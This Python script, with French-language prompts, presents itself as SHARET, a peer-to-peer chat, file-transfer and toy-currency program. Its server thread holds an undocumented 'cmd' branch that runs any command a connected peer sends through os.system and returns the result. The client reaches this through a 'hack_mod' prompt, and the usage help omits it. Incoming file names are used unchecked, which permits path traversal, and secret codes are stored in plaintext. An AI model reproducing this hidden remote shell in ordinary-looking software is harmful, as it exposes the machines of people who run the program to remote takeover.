import time,threading,os,sqlite3,random,sys,getpass

global fg
fg=1
def intro():
	global hosta,hostb,version,temp
	version="0.6"

	try:
		os.mkdir('virtual/')
		os.mkdir('virtual/system')
		os.mkdir('virtual/receved')
		os.mkdir('virtual/sended')
	except FileExistsError:
		pass


	print(" \t\tBIENVENUE DANS SHARET\n\t by toutpuissantged \n\t\t contact :: mail :amoussougedeon13@gmail.com  ; whatsapps+telegrame : +228 96870360\n \t\t\tversion : {} \n".format(version))
	date=int(time.time())
	expir=1689807440
	rest=int(expir-date)
	r_j=int(rest/(60*60*24))

	if date>=expir :
	    print("votre logiciel a expirer depuis {} jours et a besoin d'une mise a jour  \n veillez contacter le developeur par mail au toutpuissant69@gmail.com ou sur whatsapps + telegrame sur +228 96870360 \n NB : le present logiciel est 100% gratuit le developeur vous fournira egalement les maj totalement gratuitement .merci".format(-r_j))
	    time.sleep(5)
	    exit()
	else:
	    print(" \t\ttemps restant avant la mis a jour : {} jours ".format(r_j))

	comp='a'
	donnee=(comp)
	try:
	  conn=sqlite3.connect("virtual/system/base.db")
	  cur=conn.cursor()
	  cur.execute("create table info2 (dat )")
	  cur.execute("insert into info2 (dat) values(?)",donnee)
	  conn.commit()
	  cur.close()
	  conn.close()
	  conn=sqlite3.connect("virtual/system/base.db")
	  cur=conn.cursor()
	  pseudo=input(" entrer votre pseudonyme : ")
	  mcode=input(" entrer votre code secret money : ")
	  money=100
	  hache=random.randint(9999999,9999999999)
	  don=(pseudo,mcode,money,hache)
	  cur.execute("create table info (pseudo ,code,money integer,hache integer)")
	  cur.execute("insert into info (pseudo,code,money,hache) values(?,?,?,?)",don)
	  print("enregistrement effectuer ...")
	  conn.commit()
	  cur.close()
	  conn.close()

	except sqlite3.OperationalError:
		pass

	defo=input('utiliser les parametres par defaut ?(Y/n) : ')
	if defo=='n':
		hosta=input("entrer votre adresse reseau : ")
		if hosta=="":
		    hosta="localhost"
		hostb=input("entrer l'adresse de votre ami : ")
		if hostb=="":
		    hostb="localhost"
		temp=input("temps d'attente de votre ami(en seconde) : ")
		if temp=="":
		    temp=1
	else:
		hosta,hostb,temp="localhost","localhost",1

   
def serveur():
    inte=1
    port = 5566
    n=0
    tim4=0.0
    deb=0
    if inte==1:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host1=socket.gethostname()
        host1=hosta
        sock.bind((host1,port))
    if n==0:
        print(" votre adresse reseau est : ",str(hosta))
        n+=1
    while inte:
        sock.listen()
        conn, adress =sock.accept()

        while inte:
            msg2=conn.recv(1024).decode("utf8")
            if msg2=="send":
                neu=1
                nou=0
                msg3=conn.recv(1024).decode("utf8")
                print("votre ami vous envoye le fichier => ",str(msg3))
                if deb==0:
                    seuc=input('apuiyer sur entrer pour valider !!! ')
                    if seuc=="":
                        seuc=5
                    else :
                        seuc=float(seuc)
                    deb+=1
                msg4="virtual/receved/"
                msg5=msg4+msg3
                fd =open(msg5,'wb')
                while neu:
                    tim1=time.time()
                    fd.write(conn.recv(1024))
                    tim2=time.time()
                    tim3=(tim2-tim1)
                    tim4+=tim3
                    if nou==0:
                        print("reception en cours")
                        nou+=1
                    if tim3>=seuc:
                        tim4=int(tim4)
                        fd.close()
                        neu=0
                        print("reception de {} terminer avec un temps de {} secondes \n votre message : ".format(msg3,tim4))
            elif msg2=="cmd":
                msg2=conn.recv(1024).decode("utf8")
                h=os.system(msg2)
                conn.send(str(h).encode("utf8"))
            elif msg2=="exit":
            	print('deconexion !!!')
            	time.sleep(1)
            	sys.exit()
            elif msg2=="money":
                mrecu=""
                mrecu=conn.recv(1024).decode("utf8")
                print("tu vient de recevoir {} money".format(mrecu))
                mrecu=int(mrecu)
                if mrecu !=0:
                    conn2=sqlite3.connect("virtual/system/base.db")
                    cur=conn2.cursor()
                    cur.execute("select money from info")
                    for l in cur:
                        liste_d=l
                    cur.execute("select pseudo from info")
                    for l in cur:
                        liste_s=l
                    cur.execute("select code from info")
                    for l in cur:
                        liste_n=l
                    cur.execute("select hache from info")
                    for l in cur:
                        liste_h=l
                    t2money=int(liste_d[0])
                    nmoney=mrecu+t2money
                    don2=(liste_s[0],liste_n[0],nmoney,liste_h[0])
                    cur.execute("insert into info (pseudo,code,money,hache) values(?,?,?,?)",don2)
                    conn2.commit()
                    cur.close()
                    conn2.close()
            else : 
                time.sleep(0.0)
                print("message de votre ami : ",str(msg2))

                
def client():
   money=100
   inte=0
   port = 5566
   n=0
   dev=1
   dba=False
   if inte==0:
       print("tentative de connection a votre ami ")
       time.sleep(int(temp))
       import socket
       host2=hostb
       socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       socket.connect((host2,port))
       print("connexion  etablie avec votre ami")
   while inte ==0:
        time.sleep(0.1)
        msg = input(" votre message : ")
        msg1=msg
        socket.send(msg.encode("utf8"))
        if msg1=="send":
            while dev:
                try:
                    name=input(str(("entrer le nom du fichier ou son chemin complet : ")))
                    time.sleep(1)
                    if '/' in name:
                    	nes=0
                    	nes2=0
                    	nes3=0
                    	for nez in name:
                    		if nez=='/':
                    			nes+=1
                    			nes3=nes2
                    		nes2+=1
                    	raw=name[nes3+1:]
                    	print('naw est : ',raw)
                    	fs =open(name,'rb')
                    else:
                    	raw=name
                    	fs =open("virtual/sended/"+name,'rb')
                    break
                except:
                    print("fichier introuvable !!! veillez verifier le fichier ")
            name=raw
            print("envoie de  {} en cours ...".format(name))
            socket.send(name.encode("utf8"))
            s1=time.time()
            socket.sendall(fs.read())
            s2=time.time()
            fs.close()
            print("temps pris pour l'envoye : " ,str(int((s2-s1)))," seconde(s)")
            print(" envoye reussi \n veillez pattienter quelque seconde puis tapez : ok")
            time.sleep(10)
        elif msg1=="exit":
        	print('deconexion !!!')
        	time.sleep(3)
        	sys.exit()
        elif msg1=='cmd':
        	ck=input('hack_mod >>> ')
        	socket.send(ck.encode("utf8"))
        	tp=socket.recv(1024).decode("utf8")
        	print(tp)
        elif msg1=='':
        	print('utilisation : \n send ==> pour envoyer un fichier \n money ==> pour envoyer de l\'argent \n exit==> por fermer le programme ')
        elif msg1=="money":
            deb=1
            msend=input("montant a envoyer : ")
            while deb:
                try:
                    msend=int(msend)
                    deb=0
                except :
                    deb=1
                    msend=input("montant incorrect ; ressayer : ")
            evy=int(msend)
            conn=sqlite3.connect("virtual/system/base.db")
            cur=conn.cursor()
            if dba==False:
	            cur.execute("select money from info")
	            for l in cur:
	                liste_d=l
	            cur.execute("select pseudo from info")
	            for l in cur:
	                liste_s=l
	            cur.execute("select code from info")
	            for l in cur:
	                liste_n=l
	            tmoney=int(liste_d[0])
	            cur.execute("select hache from info")
	            for l in cur:
	                liste_h=l
            elif dba==True:pass
            dba=True
            mdp=getpass.getpass(" entrer  code secret : ")
            if mdp==liste_n[0]: 
                if evy > tmoney:
                    envy="0"
                    print(" votre montant est insufisant ,{} money d'excedent".format(str(evy-tmoney)))
                elif 0<evy <= tmoney:
                    envy=str(evy)
                    tmoney = tmoney-evy
                    don1=(liste_s[0],liste_n[0],tmoney,liste_h[0])
                    cur.execute("insert into info (pseudo,code,money,hache) values(?,?,?,?)",don1)
                    print("montant envoyer ")
                    print("votre montant actuel est de {} money ".format(tmoney))
                else:
                    envy="0"
                    print("une erreur est survenu , transation annuler ")
            else:
                print("mot de passe erronee")
                envy="0"
            socket.sendall(envy.encode("utf8"))
            conn.commit()
            cur.close()
            conn.close()

   
intro()

t1=threading.Thread(target=serveur)
t2=threading.Thread(target=client)

t1.start()
t2.start()

while 1:
    
    t1.join()
    t2.join()
